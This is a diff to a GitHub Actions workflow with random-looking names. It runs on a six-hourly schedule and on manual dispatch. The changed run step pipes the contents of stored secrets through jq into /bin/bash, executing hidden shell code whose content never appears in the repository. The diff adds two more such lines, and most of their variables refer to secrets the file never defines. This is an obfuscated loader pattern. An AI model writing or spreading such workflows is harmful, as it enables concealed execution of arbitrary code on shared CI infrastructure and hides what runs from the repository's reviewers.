@@ -1,19 +1,23 @@
 name: kefanmin
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 3/6 * * *'
-jobs:  # 12558
+    - cron: '44 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: kefanmin
         env:
-          dsjd0: ${{ secrets.dsjd0 }}
+          bzr471: ${{ secrets.bzr471 }}
         run: |
-          echo $dsjd0 | jq -r .ur78380 | /bin/bash
-          echo $njufu7 | jq -r .cpy85 | /bin/bash
-          echo $bgsum583 | jq -r .ocsat1 | /bin/bash
-          echo $l844 | jq -r .jlzvh15 | /bin/bash
+          echo $bzr471 | jq -r .unbl70146 | /bin/bash
+          echo $mp3 | jq -r .n1 | /bin/bash
+          echo $ttcf395 | jq -r .k546 | /bin/bash
+          echo $snvd4 | jq -r .jxiv1 | /bin/bash
+          echo $inx5831 | jq -r .phq90 | /bin/bash
+          echo $ra64 | jq -r .guy3 | /bin/bash
 
